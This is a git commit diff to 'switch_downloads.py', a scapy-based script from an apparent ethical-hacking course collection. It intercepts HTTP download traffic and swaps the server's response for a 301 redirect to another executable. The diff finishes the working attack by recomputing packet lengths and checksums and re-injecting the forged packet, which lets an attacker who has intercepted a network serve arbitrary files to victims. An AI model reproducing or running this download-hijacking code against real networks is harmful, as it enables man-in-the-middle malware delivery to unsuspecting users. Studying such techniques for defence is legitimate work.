f5edbdeb5aeff4a9249e6b8addf9b0faf2c19d4c
wambugu-dennis <wambugudennis398@gmail.com>
2022-09-14 15:26:42 +0300

    commit

--- Python and Ethical Hacking scripts/switch_downloads.py
+++ Python and Ethical Hacking scripts/switch_downloads.py
@@ -18,8 +18,11 @@ def process_packet(packet):
                 ack_list.remove(my_packet[scapy.TCP].seq)
                 print("[+] Replacing download file...")
                 my_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " \
-                                            "https://www.rarlab.com/rar/winrar-x32-611.exe "
-                print(my_packet.show())
+                                            "https://www.rarlab.com/rar/winrar-x32-611.exe\n "
+                del my_packet[scapy.IP].len
+                del my_packet[scapy.IP].chksum
+                del my_packet[scapy.TCP].chksum
+                packet.set_payload(str(my_packet))
 
     packet.accept()
 
